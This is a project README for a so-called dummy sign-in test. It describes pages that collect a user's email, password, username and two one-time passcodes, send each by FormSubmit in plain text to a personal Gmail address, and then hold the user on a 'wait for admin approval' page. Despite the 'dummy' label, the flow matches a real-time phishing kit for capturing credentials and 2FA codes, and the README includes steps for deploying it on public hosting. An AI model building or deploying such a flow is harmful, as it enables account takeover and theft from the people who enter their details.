# Dummy Sign-In Test

Plain multi-step dummy authentication flow for testing purposes.  
**No design / styling** — just bare pages.

## User Flow (`index.html`)
1. Enter **Email + Password** → data is emailed to admin in plain text  
2. Enter **Username** → data is emailed to admin  
3. Enter **OTP 1** → data is emailed to admin  
4. Enter **OTP 2** → data is emailed to admin  
5. User sees a **loading / waiting page**: "Please wait for admin’s approval"

All values are accepted (completely dummy).

## Admin Portal (`admin.html`)
- Login with email: `blessedresult6@gmail.com` (any password works)
- Explains that all dummy user data arrives by email in plain text almost immediately

## How data reaches the admin
Each step uses **FormSubmit** (AJAX) to send a plain-text email to:  
**blessedresult6@gmail.com**

Subject lines look like: `Dummy Sign-In - Email + Password`, `Dummy Sign-In - Username`, etc.

The email contains a clear table/fields with:
- Email
- Password
- Username
- OTP 1
- OTP 2
- Timestamp

### Important – First-time activation
1. Serve the site over HTTP (GitHub Pages, Netlify, local server, etc.). FormSubmit does **not** work when you open the HTML file directly (`file://`).
2. Go through the user flow once with any dummy values.
3. FormSubmit will send a **confirmation email** to `blessedresult6@gmail.com`.
4. Click the activation link in that email. After activation, every future submission arrives automatically in plain text.

### Files
- `index.html` → User sign-in flow
- `admin.html` → Admin portal

Repo: https://github.com/Dennisbed1234/dummy-signin-test
